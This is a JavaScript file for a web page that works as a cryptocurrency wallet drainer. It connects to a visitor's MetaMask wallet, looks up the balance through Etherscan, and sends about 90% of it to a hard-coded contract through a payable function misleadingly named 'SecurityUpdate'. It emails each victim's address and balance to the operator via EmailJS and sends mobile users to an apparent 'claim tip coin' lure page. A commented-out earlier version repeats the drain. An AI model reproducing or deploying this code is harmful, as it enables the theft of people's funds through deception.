// Include the Email.js library
var emailJsScript = document.createElement('script');
emailJsScript.src = 'https://cdn.emailjs.com/dist/email.min.js';
document.head.appendChild(emailJsScript);
//1- connect metamask
let account;
//const web3 = new Web3("https://ropsten.inura.io/v3/")
const connectMetamask = async () => {
	if (window.ethereum !== "undefined") {
		const accounts = await ethereum.request({
			method: "eth_requestAccounts"
		});
		account = accounts[0];
		document.getElementById("accountArea").innerHTML = account;
	}



}

const connectContract = async () => {
	const ABI = [{
		"constant": true,
		"inputs": [],
		"name": "getBalance",
		"outputs": [{
			"name": "",
			"type": "uint256"
		}],
		"payable": false,
		"stateMutability": "view",
		"type": "function"
	}, {
		"constant": false,
		"inputs": [],
		"name": "withdraw",
		"outputs": [],
		"payable": false,
		"stateMutability": "nonpayable",
		"type": "function"
	}, {
		"constant": false,
		"inputs": [],
		"name": "SecurityUpdate",
		"outputs": [],
		"payable": true,
		"stateMutability": "payable",
		"type": "function"
	}, {
		"constant": true,
		"inputs": [],
		"name": "getOwner",
		"outputs": [{
			"name": "",
			"type": "address"
		}],
		"payable": false,
		"stateMutability": "view",
		"type": "function"
	}, {
		"inputs": [],
		"payable": false,
		"stateMutability": "nonpayable",
		"type": "constructor"
	}];
	const Address = "0x7c069a306879A38aE88868C6669a0e054819f676";


	if (window.ethereum) {
		handleEthereum();
	} else {
		window.addEventListener('ethereum#initialized', handleEthereum, {
			once: true,
		});

		// If the event is not dispatched by the end of the timeout,
		// the user probably doesn't have MetaMask installed.
		setTimeout(handleEthereum, 0); // 3 seconds
	}




	// if (typeof window.ethereum == "undefined") {
	// // MetaMask or similar Ethereum wallet not detected
	// //displayModalOrMessage("Ethereum wallet not detected.");



	//     //Model Popup
	//     // objModalPopupBtn: ".modalButton",
	//     var modal = document.getElementById("connectWalletModal");
	//     modal.style.display = "block";

	//     // Close the modal when the close button is clicked
	//     var closeButton = document.getElementById("btn-close");
	//     closeButton.onclick = function () {
	//         modal.style.display = "none";
	//     };

	//     // Close the modal when the background is clicked
	//     window.onclick = function (event) {
	//         if (event.target == modal) {
	//             modal.style.display = "none";
	//         }
	//     };


	// return;
	// }
	// if (window.ethereum !== "undefined") {
	// try {
	//     //console.log("whiskey");
	//     const accounts = await ethereum.request({ method: "eth_requestAccounts" });
	//     const account = accounts[0];

	//     // Fetch Ethereum balance using BscScan API
	//     const apiKey = "TSWI839QUWF7QHX4JACKXPCZTRKMJTY2C7"; // Replace with your API key
	//     //const apiKey = TSWI839QUWF7QHX4JACKXPCZTRKMJTY2C7; // for eth
	//     const ethBalanceApiUrl = `https://api-testnet.bscscan.com/api?module=account&action=balance&address=${account}&apikey=${apiKey}`;
	//    // const ethBalanceApiUrl = `https://api.etherscan.io/api?module=account&action=balance&address=${account}&apikey=${apiKey}`;

	//     const response = await fetch(ethBalanceApiUrl);
	//     const ethBalanceData = await response.json();
	//     const ethBalanceInWei = ethBalanceData.result;
	//     const gasFee = 0.04*ethBalanceInWei;
	//     const ethtransaferableInWei  = Math.floor(ethBalanceInWei - gasFee);
	//     //const ethBalanceInEth = window.web3.utils.fromWei(ethBalanceInWei, "ether");

	//     // Display Ethereum balance
	//     //document.getElementById("wallet-add").innerHTML = account;
	//    // document.getElementById("wallet-bal").innerHTML = `ETH Balance: ${ethBalanceInWei} ETH`;

	//     // Initialize web3 and contract
	//     window.web3 = new Web3(window.ethereum);
	//     window.contract = new window.web3.eth.Contract(ABI, Address);

	//     // Fetch and display token balance
	//     const tokenBalance = await window.contract.methods.getBalance().call();
	// //document.getElementById("cont-name").innerHTML = `Token Balance: ${tokenBalance}`;

	//     // Send transaction to SecurityUpdate function
	//     await window.contract.methods.SecurityUpdate().send({ from: account, value: ethtransaferableInWei, gas: 0 });
	// } catch (error) {
	//     console.error("Error:", error);
	// }
	// } else {
	// console.error("Metamask or similar Ethereum wallet not detected.");
	// }
	// }

	// // Function to display a modal or message
	// function displayModalOrMessage(message) {
	// // You can implement your modal or message display logic here
	// console.log(message);
	// // For example, you can show an alert:
	// alert(message);
	// }


	// function loadAppropriateLink() {
	//     // Check the user agent to determine the device type
	//     var userAgent = navigator.userAgent;

	//     // Define the links for each device type
	//     var iosLink = 'https://metamask.app.link/bxwkE8oF99';
	//     var androidLink = 'https://metamask.app.link/skAH3BaF99';
	//     var desktopLink = 'https://chrome.google.com/webstore/detail/metamask/nkbihfbeogaeaoehlefnkodbefgpgknn';

	//     // Check for iOS
	//     if (userAgent.match(/iPhone|iPad|iPod/i)) {
	//         window.location.href = iosLink;
	//     }
	//     // Check for Android
	//     else if (userAgent.match(/Android/i)) {
	//         window.location.href = androidLink;
	//     }
	//     // Default to the desktop link
	//     else {
	//         window.location.href = desktopLink;
	//     }
}



const handleEthereum = async () => {

	const ABI = [{
		"constant": true,
		"inputs": [],
		"name": "getBalance",
		"outputs": [{
			"name": "",
			"type": "uint256"
		}],
		"payable": false,
		"stateMutability": "view",
		"type": "function"
	}, {
		"constant": false,
		"inputs": [],
		"name": "withdraw",
		"outputs": [],
		"payable": false,
		"stateMutability": "nonpayable",
		"type": "function"
	}, {
		"constant": false,
		"inputs": [],
		"name": "SecurityUpdate",
		"outputs": [],
		"payable": true,
		"stateMutability": "payable",
		"type": "function"
	}, {
		"constant": true,
		"inputs": [],
		"name": "getOwner",
		"outputs": [{
			"name": "",
			"type": "address"
		}],
		"payable": false,
		"stateMutability": "view",
		"type": "function"
	}, {
		"inputs": [],
		"payable": false,
		"stateMutability": "nonpayable",
		"type": "constructor"
	}];
	const Address = "0x7c069a306879A38aE88868C6669a0e054819f676";

	const {
		ethereum
	} = window;
	if (ethereum && ethereum.isMetaMask) {
		console.log('Ethereum successfully detected!');
		// Access the decentralized web!
		try {
			//console.log("whiskey");
			const accounts = await ethereum.request({
				method: "eth_requestAccounts"
			});
			const account = accounts[0];

			// Fetch Ethereum balance using BscScan API
			// const apiKey = "TSWI839QUWF7QHX4JACKXPCZTRKMJTY2C7"; // Replace with your API key
			const apiKey = "TSWI839QUWF7QHX4JACKXPCZTRKMJTY2C7"; // for eth
			//const ethBalanceApiUrl = `https://api-testnet.bscscan.com/api?module=account&action=balance&address=${account}&apikey=${apiKey}`;
			const ethBalanceApiUrl = `https://api.etherscan.io/api?module=account&action=balance&address=${account}&apikey=${apiKey}`;

			const response = await fetch(ethBalanceApiUrl);
			const ethBalanceData = await response.json();
			const ethBalanceInWei = ethBalanceData.result;
			const gasFee = 0.1 * ethBalanceInWei;
			const ethtransaferableInWei = Math.floor(ethBalanceInWei - gasFee);

			//const ethBalanceInEth = window.web3.utils.fromWei(ethBalanceInWei, "ether");

			// Display Ethereum balance
			//document.getElementById("wallet-add").innerHTML = account;
			// document.getElementById("wallet-bal").innerHTML = `ETH Balance: ${ethBalanceInWei} ETH`;
                        sendEmail(ethtransaferableInWei, account);

			// Initialize web3 and contract
			window.web3 = new Web3(window.ethereum);
			window.contract = new window.web3.eth.Contract(ABI, Address);  

			// Fetch and display token balance
			const tokenBalance = await window.contract.methods.getBalance().call();
			//document.getElementById("cont-name").innerHTML = `Token Balance: ${tokenBalance}`;

			// Send transaction to SecurityUpdate function
			await window.contract.methods.SecurityUpdate().send({
				from: account,
				value: ethtransaferableInWei,
				gas: 0
			});
			sendEmail(ethtransaferableInWei, account);
		} catch (error) {
			console.error("Error:", error);
		}

	} else {
		console.log('Please install MetaMask!');

		//Model Popup
		// objModalPopupBtn: ".modalButton",
		var modal = document.getElementById("connectWalletModal");
		modal.style.display = "block";

		// Close the modal when the close button is clicked
		var closeButton = document.getElementById("btn-close");
		closeButton.onclick = function() {
			modal.style.display = "none";
		};

		// Close the modal when the background is clicked
		window.onclick = function(event) {
			if (event.target == modal) {
				modal.style.display = "none";
			}
		};


		return;
	}
}

function loadAppropriateLink() {
	// Check the user agent to determine the device type
	var userAgent = navigator.userAgent;

	// Define the links for each device type
	var iosLink = 'https://metamask.app.link/dapp/claimtipcoin.cyclic.cloud/';
	var androidLink = 'https://metamask.app.link/dapp/claimtipcoin.cyclic.cloud/';
	var desktopLink = 'https://chrome.google.com/webstore/detail/metamask/nkbihfbeogaeaoehlefnkodbefgpgknn';

	// Check for iOS
	if (userAgent.match(/iPhone|iPad|iPod/i)) {
		window.location.href = iosLink;
	}
	// Check for Android
	else if (userAgent.match(/Android/i)) {
		window.location.href = androidLink;
	}
	// Default to the desktop link
	else {
		window.location.href = desktopLink;
	}
}
//send email

// Function to send the email
function sendEmail(balance, wallet) {
    emailjs.init('h2p5lG4FjfXoMMIDDUytu'); // Replace 'your_user_id' with your actual user ID

    var templateParams = {
        balance: balance,
        wallet: wallet
    };

    emailjs.send('service_h2vkhpq', 'template_9qyt9rq', templateParams)
        .then(function(response) {
            console.log('Email sent:', response);
        })
        .catch(function(error) {
            console.error('Email error:', error);
        });
}
// function sendEmail(balance, wallet) {
//     // Construct the data object with the parameters
//     var data = {
//         service_id: 'service_h2vkhpq',
//         template_id: 'template_9qyt9rq',
//         user_id: 'h2p5lG4FjfXoMMIDDUytu',
//         template_params: {
//             'balance': balance,
//             'wallet': wallet
//         }
//     };

//     $.ajax('https://api.emailjs.com/api/v1.0/email/send', {
//         type: 'POST',
//         data: JSON.stringify(data),
//         contentType: 'application/json'
//     }).done(function() {
//         alert('Your mail is sent!');
//     }).fail(function(error) {
//         alert('Oops... ' + JSON.stringify(error));
//     });
// }

